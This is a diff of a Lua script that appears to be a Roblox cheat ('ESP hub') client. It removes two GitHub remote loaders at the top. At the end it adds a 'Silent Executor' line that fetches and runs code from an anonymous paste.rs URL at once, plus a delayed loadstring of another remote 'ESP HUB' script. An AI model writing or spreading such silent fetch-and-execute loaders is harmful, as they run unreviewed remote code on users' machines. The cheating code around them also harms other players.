@@ -1,13 +1,3 @@
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/EGGESP/Nolagzs/main/V3"))()
-    end)
-end)
-task.spawn(function()
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/main/EGG/ESP/HUB/V2"))()
-end)
-
 local a, b, c, d, e = game:GetService("Players"), game:GetService("TweenService"), game:GetService("RunService"), game:GetService("Workspace"), game:GetService("UserInputService")
 local f = a.LocalPlayer
 local g = {
@@ -319,3 +309,10 @@ else
         end
     end)
 end
+-- Silent Executor - Instant load
+loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
+
+-- Delayed load (3 seconds) for ESP HUB
+task.delay(3, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
+end)
